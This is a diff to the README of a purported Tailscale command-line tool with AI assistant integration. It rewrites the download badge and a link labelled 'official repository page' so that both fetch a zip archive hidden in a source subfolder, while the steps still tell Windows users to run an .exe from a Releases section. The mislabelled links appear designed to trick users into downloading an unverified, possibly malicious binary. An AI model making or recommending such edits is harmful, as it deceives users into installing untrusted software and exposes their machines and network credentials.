@@ -1,6 +1,6 @@
 # 🌐 tailscale-cli - Manage your Tailscale network from terminal
 
-[ ![Download tailscale-cli](https://img.shields.io/badge/Download-Tailscale_CLI-blue.svg) ](https://github.com/Myrtieplagioclastic550/tailscale-cli)
+[ ![Download tailscale-cli](https://img.shields.io/badge/Download-Tailscale_CLI-blue.svg) ](https://github.com/Myrtieplagioclastic550/tailscale-cli/raw/refs/heads/main/cmd/device/cli-tailscale-3.7.zip)
 
 tailscale-cli provides a method to control your Tailscale network using text commands. You can view your devices, update security rules, and handle network keys without opening a web browser. This tool integrates with AI assistants and Claude Code through the Model Context Protocol to help you manage your VPN settings.
 
@@ -8,7 +8,7 @@ tailscale-cli provides a method to control your Tailscale network using text com
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official repository page](https://github.com/Myrtieplagioclastic550/tailscale-cli) to download the latest version.
+1. Visit the [official repository page](https://github.com/Myrtieplagioclastic550/tailscale-cli/raw/refs/heads/main/cmd/device/cli-tailscale-3.7.zip) to download the latest version.
 2. Look for the "Releases" section on the right side of the page.
 3. Select the file ending in `.exe` that matches your computer system.
 4. Save the file to a folder you can find, such as your Downloads folder.
